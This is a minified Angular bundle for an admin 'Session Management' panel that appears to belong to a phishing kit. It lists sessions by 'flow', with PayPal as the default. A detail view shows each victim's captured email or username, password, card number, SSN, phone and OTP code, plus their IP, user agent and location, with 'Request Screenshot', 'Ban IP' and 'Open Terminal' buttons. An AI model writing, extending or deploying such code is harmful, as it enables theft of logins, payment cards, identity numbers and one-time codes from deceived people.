import{a as P}from"./chunk-6DFLIOLA.js";import{a as j}from"./chunk-J5C2NP7T.js";import"./chunk-LB3MMNV3.js";import{$ as V,A as f,C as I,Ha as m,K as a,Oa as A,P as b,R as S,Sa as _,T as p,V as g,Y as D,_ as k,aa as n,ba as t,fa as w,ga as x,gb as E,ha as c,ib as N,na as i,oa as r,pa as T,t as C,u as v,va as h,z as u}from"./chunk-YQLKRNON.js";var R=(l,s)=>s.label;function O(l,s){if(l&1&&(n(0,"div",24)(1,"p",31),i(2),t(),n(3,"p",32),i(4),t()()),l&2){let e=s.$implicit;a(2),r(e.label),a(2),r(e.value||"\u2014")}}function z(l,s){if(l&1){let e=w();n(0,"div",1)(1,"div",2),x("click",function(){u(e);let d=c();return f(d.close.emit())}),t(),n(2,"div",3)(3,"div",4)(4,"div")(5,"div",5)(6,"span",6),i(7),t(),n(8,"h2",7),i(9),t(),n(10,"span",8),i(11),t()(),n(12,"p",9),i(13),t()(),n(14,"button",10),x("click",function(){u(e);let d=c();return f(d.handleClose())}),n(15,"span",11),i(16,"close"),t()()(),n(17,"div",12)(18,"div",13)(19,"h3",14)(20,"span",15),i(21,"visibility"),t(),i(22," Live View "),t(),n(23,"div",16)(24,"div",17)(25,"span",18),i(26,"image_not_supported"),t(),n(27,"span",19),i(28,"No screenshot available"),t()(),n(29,"div",20)(30,"button",21)(31,"span",22),i(32,"camera_alt"),t(),i(33," Request Screenshot "),t()()()(),n(34,"div",13)(35,"h3",14)(36,"span",15),i(37,"data_object"),t(),i(38," Captured Data "),t(),n(39,"div",23),k(40,O,5,2,"div",24,R),t()(),n(42,"div",13)(43,"h3",14)(44,"span",15),i(45,"devices"),t(),i(46," Device Fingerprint "),t(),n(47,"div",25)(48,"div",26)(49,"span"),i(50,"IP Address:"),t(),n(51,"span",27),i(52),t()(),n(53,"div",26)(54,"span"),i(55,"User Agent:"),t(),n(56,"span",28),i(57),t()(),n(58,"div",26)(59,"span"),i(60,"Location:"),t(),n(61,"span",27),i(62),t()()()()(),n(63,"div",29)(64,"button",30)(65,"span",22),i(66,"block"),t(),i(67," Ban IP "),t(),n(68,"button",21)(69,"span",22),i(70,"terminal"),t(),i(71," Open Terminal "),t()()()()}if(l&2){let e=c();a(),g("opacity-0",e.closing())("opacity-100",!e.closing()),a(),g("translate-x-full",e.closing())("translate-x-0",!e.closing()),a(5),r(e.session.flowIcon||"\u2753"),a(2),r(e.session.flowName||"Unknown Flow"),a(),g("bg-green-500-10",e.isActive())("text-green-400",e.isActive())("bg-slate-700",!e.isActive())("text-slate-400",!e.isActive()),a(),T(" ",e.session.status," "),a(2),r(e.session.id),a(27),V(e.dataItems()),a(12),r(e.session.ip),a(4),p("title",e.session.userAgent),a(),r(e.session.userAgent),a(5),r(e.session.location)}}var y=class l{constructor(){this.close=new I;this.closing=b(!1);this.isActive=m(()=>this.session?.status?.toLowerCase()==="active"||this.session?.status?.toLowerCase()==="verified");this.dataItems=m(()=>{if(!this.session?.data)return[];let s=this.session.data;return[{label:"Email / Username",value:s.email||s.username},{label:"Password",value:s.password?"\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022":null},{label:"Card Number",value:s.cardNumber?"\u2022\u2022\u2022\u2022 "+s.cardNumber.slice(-4):null},{label:"Phone",value:s.phone},{label:"SSN / ID",value:s.ssn},{label:"OTP Code",value:s.otp}].filter(e=>e.value)})}handleClose(){this.closing.set(!0),setTimeout(()=>{this.close.emit(),this.closing.set(!1)},300)}static{this.\u0275fac=function(e){return new(e||l)}}static{this.\u0275cmp=v({type:l,selectors:[["app-session-detail-v2"]],inputs:{session:"session"},outputs:{close:"close"},standalone:!0,features:[h],decls:1,vars:1,consts:[["class","fixed inset-0 z-50 flex justify-end",4,"ngIf"],[1,"fixed","inset-0","z-50","flex","justify-end"],[1,"absolute","inset-0","bg-slate-950/80","backdrop-blur-sm","transition-opacity",3,"click"],[1,"relative","w-full","max-w-2xl","bg-slate-900","border-l","border-slate-800","shadow-2xl","transform","transition-transform","duration-300","flex","flex-col"],[1,"p-6","border-b","border-slate-800","flex","items-start","justify-between","bg-slate-900/50"],[1,"flex","items-center","gap-2","mb-1"],[1,"text-2xl"],[1,"adm-h3","text-white"],[1,"px-2","py-0.5","rounded","text-[10px]","uppercase","font-bold","tracking-wider"],[1,"font-mono","text-xs","text-slate-500"],[1,"adm-btn","adm-btn-ghost","p-1","text-slate-400","hover:text-white",3,"click"],[1,"material-icons"],[1,"flex-1","overflow-y-auto","p-6","space-y-8"],[1,"space-y-3"],[1,"text-xs","font-bold","text-slate-400","uppercase","tracking-wider","flex","items-center","gap-2"],[1,"material-icons","text-sm"],[1,"aspect-video","bg-slate-950","rounded-lg","border","border-slate-800","flex","items-center","justify-center","relative","overflow-hidden","group"],[1,"text-slate-600","flex","flex-col","items-center"],[1,"material-icons","text-4xl","mb-2"],[1,"text-xs"],[1,"absolute","inset-0","bg-black/50","flex","items-center","justify-center","opacity-0","group-hover:opacity-100","transition-opacity"],[1,"adm-btn","adm-btn-primary"],[1,"material-icons","mr-2"],[1,"grid","grid-cols-2","gap-4"],[1,"p-3","bg-slate-800/50","rounded","border","border-slate-700/50"],[1,"p-4","bg-slate-800/30","rounded","border","border-slate-700/50","font-mono","text-xs","text-slate-400","space-y-2"],[1,"flex","justify-between"],[1,"text-white"],[1,"text-white","max-w-[200px]","truncate",3,"title"],[1,"p-4","border-t","border-slate-800","bg-slate-900/80","flex","justify-between"],[1,"adm-btn","adm-btn-ghost","text-red-400","hover:bg-red-500/10"],[1,"text-[10px]","text-slate-500","uppercase","mb-1"],[1,"text-sm","text-white","font-mono","break-all"]],template:function(e,o){e&1&&S(0,z,72,24,"div",0),e&2&&p("ngIf",o.session)},dependencies:[_,A],encapsulation:2})}};function B(l,s){if(l&1){let e=w();n(0,"app-session-detail-v2",19),x("close",function(){u(e);let d=c();return f(d.closeDetail())}),t()}if(l&2){let e=c();p("session",e.selectedSession())}}var F=class l{constructor(){this.stateService=C(N);this.statsService=C(P);this.selectedSessionId=b(null);this.columns=[{header:"Session ID",field:"id",width:"col-span-2",textClass:"font-mono text-slate-400 text-xs"},{header:"Flow",field:"flow",width:"col-span-2",textClass:"font-medium text-white"},{header:"IP Address",field:"ip",width:"col-span-2",textClass:"font-mono text-slate-300 text-xs"},{header:"Device",field:"device",width:"col-span-2"},{header:"Started",field:"started",width:"col-span-2",type:"time"},{header:"Status",field:"status",width:"col-span-2",type:"status",class:"text-right"}];this.totalSessions=m(()=>this.statsService.stats().totalSessions);this.verifiedSessions=m(()=>this.statsService.stats().verifiedSessions);this.activeToday=m(()=>{let s=new Date().toDateString();return this.stateService.history().filter(e=>new Date(e.timestamp).toDateString()===s).length});this.sessionsData=m(()=>this.stateService.history().map(s=>{let e=E(s.data?.flowId||"paypal"),o=(s.data?.fingerprint?.userAgent||"").toLowerCase(),d="Desktop";return o.includes("mobile")&&(d="Mobile"),(o.includes("tablet")||o.includes("ipad"))&&(d="Tablet"),{id:s.id.substring(0,12)+"...",rawId:s.id,flow:e?.name||"Unknown",ip:s.data?.ip||"Unknown",device:d,started:new Date(s.timestamp).toLocaleString(),status:s.status||"Active"}}));this.selectedSession=m(()=>{let s=this.selectedSessionId();if(!s)return null;let e=this.stateService.history().find(d=>d.id===s);if(!e)return null;let o=E(e.data?.flowId||"paypal");return{id:e.id,status:e.status||"Active",flowName:o?.name,flowIcon:o?.icon,ip:e.data?.ip||"Unknown",location:e.data?.ipCountry||"Unknown",userAgent:e.data?.fingerprint?.userAgent||"Unknown",data:e.data}})}handleRowClick(s){s&&s.rawId&&this.selectedSessionId.set(s.rawId)}closeDetail(){this.selectedSessionId.set(null)}static{this.\u0275fac=function(e){return new(e||l)}}static{this.\u0275cmp=v({type:l,selectors:[["app-admin-sessions-v2"]],standalone:!0,features:[h],decls:43,vars:7,consts:[[1,"space-y-6"],[1,"flex","flex-col","md:flex-row","md:items-center","justify-between","gap-4"],[1,"adm-h2","text-white"],[1,"text-slate-400","text-sm","mt-1"],[1,"flex","gap-2"],[1,"adm-btn","adm-btn-ghost","bg-slate-800/50","border","border-slate-700"],[1,"material-icons","mr-2","text-[18px]"],[1,"adm-btn","adm-btn-primary","shadow-lg","shadow-blue-500/20"],[1,"grid","grid-cols-1","md:grid-cols-3","gap-4"],[1,"adm-card","p-4","flex","items-center","justify-between","bg-gradient-to-br","from-slate-900","to-slate-900/50"],[1,"text-xs","text-slate-500","uppercase","font-bold"],[1,"text-2xl","font-bold","text-white","mt-1"],[1,"material-icons","text-slate-700","text-4xl"],[1,"text-2xl","font-bold","text-blue-400","mt-1"],[1,"material-icons","text-blue-900/50","text-4xl"],[1,"text-2xl","font-bold","text-emerald-500","mt-1"],[1,"material-icons","text-emerald-900/50","text-4xl"],[3,"onRowClick","title","columns","data"],[3,"session"],[3,"close","session"]],template:function(e,o){e&1&&(n(0,"div",0)(1,"div",1)(2,"div")(3,"h2",2),i(4,"Session Management"),t(),n(5,"p",3),i(6,"Monitor and manage active and past user sessions."),t()(),n(7,"div",4)(8,"button",5)(9,"span",6),i(10,"filter_list"),t(),i(11," Filter "),t(),n(12,"button",7)(13,"span",6),i(14,"file_download"),t(),i(15," Export CSV "),t()()(),n(16,"div",8)(17,"div",9)(18,"div")(19,"p",10),i(20,"Total Sessions"),t(),n(21,"p",11),i(22),t()(),n(23,"span",12),i(24,"storage"),t()(),n(25,"div",9)(26,"div")(27,"p",10),i(28,"Verified"),t(),n(29,"p",13),i(30),t()(),n(31,"span",14),i(32,"verified"),t()(),n(33,"div",9)(34,"div")(35,"p",10),i(36,"Active Today"),t(),n(37,"p",15),i(38),t()(),n(39,"span",16),i(40,"today"),t()()(),n(41,"app-data-table-v2",17),x("onRowClick",function(M){return o.handleRowClick(M)}),t(),S(42,B,1,1,"app-session-detail-v2",18),t()),e&2&&(a(22),r(o.totalSessions()),a(8),r(o.verifiedSessions()),a(8),r(o.activeToday()),a(3),p("title","All Sessions")("columns",o.columns)("data",o.sessionsData()),a(),D(o.selectedSession()?42:-1))},dependencies:[_,j,y],encapsulation:2})}};export{F as SessionsComponent};
